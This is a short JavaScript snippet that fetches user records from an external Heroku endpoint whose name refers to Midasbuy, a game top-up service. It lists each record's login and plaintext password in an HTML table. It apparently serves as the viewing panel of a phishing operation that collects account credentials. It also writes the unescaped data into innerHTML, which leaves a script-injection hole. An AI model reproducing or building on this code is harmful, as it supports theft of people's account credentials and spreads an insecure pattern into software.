const tBody = document.querySelector("#tBody")
const btn = document.querySelector("#btn")

btn.onclick = () => {
    tBody.innerHTML = ''
  axios.get('https://midasbuy-fuck.herokuapp.com/api/user')
    .then(res => {
      if (res.data !== 'error') {
      for(u of res.data) {
        tBody.innerHTML += `
        <tr>
          <th scope="col">${u.id}</th>
          <td>${u.login}</td>
          <td>${u.password}</td>
        </tr>` 
      }
    } else {
        alert("Users not found")  
        }
    })
}
